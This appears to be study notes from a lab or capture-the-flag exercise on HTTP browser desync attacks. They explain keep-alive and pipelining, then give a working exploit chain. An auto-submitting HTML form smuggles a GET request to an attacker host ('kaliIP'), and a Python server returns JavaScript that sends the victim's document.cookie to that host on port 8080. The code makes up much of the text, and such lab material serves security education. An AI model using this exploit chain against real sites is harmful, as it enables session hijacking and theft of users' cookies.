https://portswigger.net/research/http2


Desynchronizing the interpretation of requests within browsers adds a layer of complexity and opens up new possibilities for exploitation. This new technique necessitates only the desynchronization of the front-end server, impacting the victim's connection with their browser.

**HTTP Keep-Alive** -HTTP keep-alive is a mechanism that allows the reuse of a single TCP connection for multiple HTTP requests and responses. If caching mechanisms are in place, the persistence of connections through keep-alive could contribute to cache poisoning attacks. 

**HTTP Pipelining** - If the HTTP pipelining is enabled in the backend server, it will allow the simultaneous sending of two requests with the corresponding responses without waiting for each response. The only way to differentiate between two requests and a big one is by using the Content-Length header, which specifies the length in bytes of each request. 

Three requests are sent during a Browser Desync attack:
1. Initial request
2. Smuggled request from attacker
3. Next legit request

![](/assets/images/HTTP%20Browser%20Desync/desync1.png)

In the diagram above, the client (**1**) initiates a POST request utilizing the keep-alive feature, ensuring the connection remains persistent. This persistence allows for transmitting multiple requests within the same session. This POST request contains a (**2**) hijack GET request within its body. If the web server is vulnerable, it mishandles the request body, leaving this hijack request in the connection queue. Next, when the client makes (**3**)another request, the hijack GET request is added at the forefront, replacing the expected behavior.


### Example
The `fetch` JavaScript function allows for maintaining the connection ID across requests. This consistent connection ID lies in its ability to facilitate exploitation for an attacker that could expose user information or session tokens such as cookies.

Moreover, in a cross-site attack, the browser shares user cookies based on how the `SameSite` flag is set (CORS), but this security rule doesn't apply if the current domain matches the remote one, as in Browser Desync attacks.


```HTML
<form id="btn" action="http://challenge.thm/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://kaliIP:1337 HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>
```
- A form like this *inherently supports a keep-alive connection by default*. The type is used to avoid the default encoding MIME type since we don't want to encode the second malicious request.

At the same time, run this python script starting a server on port 1337 which serves another command to return cookies on port 8080:
```python
#!/usr/bin/python3
    
from http.server import BaseHTTPRequestHandler, HTTPServer

class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type","text/html")

            self.end_headers()
            self.wfile.write(b"fetch('http://kaliIP:8080/' + document.cookie)")
def run_server(port=1337):   
    server_address = ('', port)
    httpd = HTTPServer(server_address, ExploitHandler)
    print(f"Server running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```
- This does require that a different server be run on port 8080 to catch the cookies